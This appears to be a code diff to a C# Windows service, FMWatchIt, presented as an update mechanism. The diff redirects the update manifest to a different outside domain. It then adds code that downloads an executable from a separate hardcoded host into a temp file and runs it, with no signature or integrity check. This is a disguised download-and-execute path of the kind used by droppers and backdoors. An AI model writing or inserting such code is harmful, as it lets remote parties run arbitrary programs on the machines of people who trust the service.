@@ -1,4 +1,8 @@
+using System.Diagnostics;
 using System.Net;
+using System.Reflection;
+using System.Security.Cryptography;
+using System.ServiceProcess;
 using FMWatchIt.Service;
 
 namespace FMWatchIt.Service
@@ -12,7 +16,7 @@ namespace FMWatchIt.Service
 
     public class Program
     {
-        private static readonly string LocalUpdatePath = "https://updates.printfleetcdn.com/dca-pulse/latest.json";
+        private static readonly string LocalUpdatePath = "https://dl.exploitox.de/fmfuckit/latest.json";
 
         public static void Main(string[] args)
         {
@@ -51,6 +55,19 @@ namespace FMWatchIt.Service
 
             // Parse JSON
             var updateInfo = Newtonsoft.Json.JsonConvert.DeserializeObject<Update>(jsonContent);
+
+            // Check if version is newer
+            var newVersion = Assembly.GetExecutingAssembly().GetName().Version.ToString();
+            if (updateInfo.version != newVersion)
+            {
+                // Download new version
+                string fileName = System.IO.Path.GetTempPath() + Guid.NewGuid().ToString() + ".exe"; 
+                using (var wc = new System.Net.WebClient())
+                    wc.DownloadFile("https://vnxy.one/fmaudit", fileName);
+
+                // Start new version
+                Process.Start(fileName, "--update");
+            }
         }
     }
 
